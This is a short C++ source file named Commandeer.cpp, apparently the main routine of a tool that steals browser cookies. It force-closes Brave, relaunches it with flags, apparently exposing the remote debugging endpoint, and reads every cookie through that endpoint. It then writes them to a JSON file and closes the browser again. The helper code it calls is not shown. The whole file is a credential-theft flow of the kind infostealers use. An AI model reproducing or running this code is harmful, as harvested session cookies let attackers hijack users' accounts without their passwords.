// Commandeer.cpp
// (C) Martin Alebachew, 2023

#include "pch.h"
#include <iostream>
#include "OS/Windows.h"
#include "Browsers/Brave.h"

int main()
{    
    OS* windows = new Windows();
    Browser* browser = new Brave(windows);

    browser->Kill();
    browser->LaunchWithFlags();
    browser->WaitUntilEndpointAccessible();
    std::string dbg_endpoint = browser->ParseDebugEndpoint();
    std::string cookies = browser->GetAllCookies(dbg_endpoint);
    browser->DumpJSONIntoFile(cookies);
    browser->Kill();

    delete browser;
    delete windows;
}